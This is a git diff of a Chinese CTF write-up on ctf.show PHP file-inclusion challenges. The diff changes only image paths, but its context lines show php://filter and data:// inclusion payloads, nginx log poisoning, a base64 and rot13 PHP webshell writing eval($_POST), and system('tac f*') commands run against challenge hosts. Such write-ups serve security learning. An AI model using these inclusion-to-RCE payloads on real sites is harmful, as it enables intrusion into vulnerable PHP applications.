@@ -29,7 +29,7 @@ if(isset($_GET['file'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 这个题目其实和我们当时做RCE远程代码执行的时候有做到过，我们如果要通过include读取文件，就需要用到http://filter协议去读取源码
 
@@ -37,7 +37,7 @@ if(isset($_GET['file'])){
 http://4258ef9c-e6a8-45ef-a0b4-b43bc0a5a484.challenge.ctf.show/?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
-<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到的base64编码是
 
@@ -93,7 +93,7 @@ if(isset($_GET['file'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>
 
 上述代码的意思大概就是，我们得到的$file变量，要先将php替换为？？？再进行执行，那么我们读取文件就不能用php://filter和php://input这两个了，我们可以使用data://去通过include去执行我们输入的php片段，这个php片段可以直接查看flag.php代码。
 
@@ -103,7 +103,7 @@ http://928e3ddc-0ea1-404a-a9d9-fb53aface656.challenge.ctf.show/?file=data://text
 
 得到最后的flag。
 
-<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:purple;background-color:green;">（3）web80</mark>
 
@@ -132,7 +132,7 @@ if(isset($_GET['file'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 这次不止过滤了php，还过滤了data，所以得用日志包含，我们现在需要知道这个用的什么框架。我们可以用linux的whatweb指令
 
@@ -140,7 +140,7 @@ if(isset($_GET['file'])){
 whatweb http://ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show/ 
 ```
 
-<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以从上面看到有nginx，nginx在linux下面的日志目录在/var/log/nginx/access.log中，并且会包含user-agent和路径。
 
@@ -160,7 +160,7 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以看到我们的代码起作用了，后面显示了我们当前目录下的文件，有fl0g.php。我们接下来只要查看flag.php的源代码就可以了，直接cat flag.php,
 
@@ -266,7 +266,7 @@ if(isset($_GET['file'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这道题帮我加深了我的绕过，我甚至之前都没彻底理解了getshell，现在我才理解到这个真正的含义。
 
@@ -288,7 +288,7 @@ content=abPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
 http://1bd6bcd0-f840-4cc2-9665-0601cbe23a6d.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们就会看到一片空白，这说明我们的文件已经上传上去了，getshell。yes。
 
@@ -296,11 +296,11 @@ http://1bd6bcd0-f840-4cc2-9665-0601cbe23a6d.challenge.ctf.show/?file=%25%37%30%2
 
 然后我们可以传参去查看f开头的文件。你也可以先传入system('ls');去查看当前目录下的文件。
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 最后得到flag。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -330,7 +330,7 @@ if(isset($_GET['file'])){
 }
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以看到过滤了php的协议，但是没有过滤=，所以我们用data://伪协议直接传递php代码，然后执行
 
@@ -346,7 +346,7 @@ http://597fa6fc-ea54-4078-b972-0c0e6295813d.challenge.ctf.show/?file=data://text
 
 然后查看源码，发现flag。
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -396,7 +396,7 @@ contents=?<hp pvela$(P_SO[T]1;)>?
 
 写入成功了，但是这个没有回显，没关系，我们直接去看目录下的这个文件，然后传入查看文件的指令
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 GET:
 
@@ -410,4 +410,4 @@ POST:
 1=system('tac f*');
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
